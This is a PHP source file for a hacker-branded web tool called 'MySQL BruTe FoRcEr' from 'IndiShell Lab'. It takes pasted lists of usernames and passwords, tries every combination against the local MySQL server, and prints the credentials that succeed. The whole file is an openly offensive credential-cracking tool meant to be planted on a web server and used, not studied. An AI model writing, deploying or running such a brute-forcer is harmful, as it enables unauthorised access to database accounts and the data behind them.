
<?php
/*Coded by Jagriti aka Incredible at indishell Lab*/
session_start();
set_time_limit(0);


 $head = '
<html>
<head>
</script>
<title>--==[[MySQL BruTe FoRcEr By Incredible]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 2px #333;
color: #FFF;
}
td {
BORDER: dashed 2px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 0px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border : solid 3px ;
border-color : #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border : dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: Red; TEXT-DECORATION: none
}
A:active {
color: Red; TEXT-DECORATION: none
}
</STYLE>
'; ?>
<html>
<head>
<?php 
echo $head ;
echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >


       <td width="100%" align=center valign="top" rowspan="1">
           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ MySQL </font><font color=white size=5 face="comic sans ms"><b> BruTeFoRcEr </font><font color=green size=5 face="comic sans ms"><b>By IndiShElL]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1">
        <font color=#ff9933> 
        ##################################################</font><font color=white>###################################################</font><font color=green>##################################################</font><br><font size=3 color=#ff9933 face="comic sans ms">
        Love To: <br><font size=2 color=white face="comic sans ms">Surbhi, Mrudu, Hary, Kavi ^_^ </font><br>
        Greetz to : <br><font size=2 color=white face="comic sans ms">Code Breaker ICA , 1046 ^_^ and Team IndiShell </font><br>
        </font>
         
        <font color=#ff9933> 
        ##################################################</font><font color=white>###################################################</font><font color=green>##################################################</font>
           </table>
       </table> 

'; 

?>
<body bgcolor=black><div align=center><br>
<font color=white size=3 style="comic sans ms">
<table width=30%><tr><td width=50% align=center> <font color=#ff9933>username</td><td width=50% align=center> <font color=#ff9933>password</td></tr></table>
<form method=post>
<textarea rows=18 cols=25 name=uname>
</textarea>
<textarea rows=18 cols=25 name=pass>
</textarea>
<br><br>
<input type=submit name=sbmt value="Launch Attack >:D<">
</form>

<?php
set_time_limit(0);

error_reporting(0);
if(isset($_POST['sbmt']))
{
$uname=$_POST['uname'];
$pass=$_POST['pass'];
$uexploded=explode("\n",$uname);
$passexploded=explode("\n",$pass);

foreach($uexploded as $ufinal)
{
echo "attackig username..".$ufinal."<br>";
$ufinal1=trim($ufinal);
foreach($passexploded as $passfinal)
{
$passfinal1=trim($passfinal);
//$connect=;
if($ufinal1!=='')
{
$r=mysql_connect('localhost',$ufinal1,$passfinal1);
if(preg_match('/id/i',(string)$r))
{
echo "<table width=70% ><tr><td align=center><b><font color=white size=3>cracking success with username  <font color=#ff9933>".$ufinal."</font> and password  <font color=#ff9933>".$passfinal."</font></td></tr></table>";
}
}
}


}

}

echo "<br>";
?>

<style type="text/css">#cot_tl_fixed{background-color:black;position:fixed;bottom:0px;font-Asize:50px;left:0px;padding:3px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}</style>
<span style="color: white;">
<div id="cot_tl_fixed"><marquee>Coded By:- Incredible @ INDISHELL Lab</marquee></div></span>

///////////////////////////////////////////////////////////////////////////
